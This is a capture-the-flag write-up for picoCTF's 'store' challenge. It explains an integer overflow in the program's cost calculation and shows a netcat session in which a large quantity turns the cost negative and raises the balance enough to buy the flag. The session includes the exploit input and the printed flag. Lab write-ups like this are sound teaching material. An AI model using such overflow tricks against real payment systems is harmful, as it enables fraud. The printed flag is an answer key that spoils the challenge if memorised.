## store - 400

### Description

> We started a little store, can you buy the flag? Source. Connect with 2018shell1.picoctf.com 43581.

### Write up

```
int number_flags = 0;
fflush(stdin);
scanf("%d", &number_flags);
if(number_flags > 0){
    int total_cost = 0;
    total_cost = 1000*number_flags;
```

overflow happens in `total_cost = 1000*number_flags`

```
if(total_cost <= account_balance){
    account_balance = account_balance - total_cost;
    printf("\nYour new balance: %d\n\n", account_balance);
}
```

So, we can increase `account_balance` here.

```
$ nc 2018shell1.picoctf.com 43581
Welcome to the Store App V1.0
World's Most Secure Purchasing App

[1] Check Account Balance

[2] Buy Stuff

[3] Exit

 Enter a menu selection
2
Current Auctions
[1] I Can't Believe its not a Flag!
[2] Real Flag
1
Imitation Flags cost 1000 each, how many would you like?
2148483

Your total cost is: -2146484296

Your new balance: 2146485396

Welcome to the Store App V1.0
World's Most Secure Purchasing App

[1] Check Account Balance

[2] Buy Stuff

[3] Exit

 Enter a menu selection
2
Current Auctions
[1] I Can't Believe its not a Flag!
[2] Real Flag
2
A genuine Flag costs 100000 dollars, and we only have 1 in stock
Enter 1 to purchase1
YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_6bd13a8c}
```
